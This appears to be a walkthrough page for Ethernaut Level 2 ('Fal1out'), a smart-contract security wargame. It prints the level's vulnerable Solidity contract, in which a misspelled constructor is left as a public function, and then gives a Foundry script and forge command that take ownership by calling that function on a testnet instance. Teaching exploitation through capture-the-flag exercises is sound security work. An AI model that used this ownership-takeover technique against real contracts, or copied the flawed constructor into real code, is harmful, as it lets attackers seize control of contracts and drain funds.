---
title: Fal1out
weight: 3
type: docs
next: coin-flip
prev: fallback
---

[Level2](https://ethernaut.openzeppelin.com/level/2) - ⭐

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

We have to claim the owner ship of the program, we can see that their is nothing that seems to prevent us from calling Fal1out() so let’s try that:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface Fallout {
  function allocatorBalance(address allocator) external view returns (uint);

  function Fal1out() external payable;

  function allocate() external payable;

  function sendAllocation(address payable allocator) external;

  function collectAllocations() external;
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_02");
        console.logAddress(addr);
        vm.startBroadcast(deployerPrivateKey);

        Fallout instance = Fallout(addr);
        instance.Fal1out{value: 1}(); //value 1 isnot needed but just in case

        vm.stopBroadcast();
    }
}
```

```solidity
source .env
forge script ./script/02.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv
```
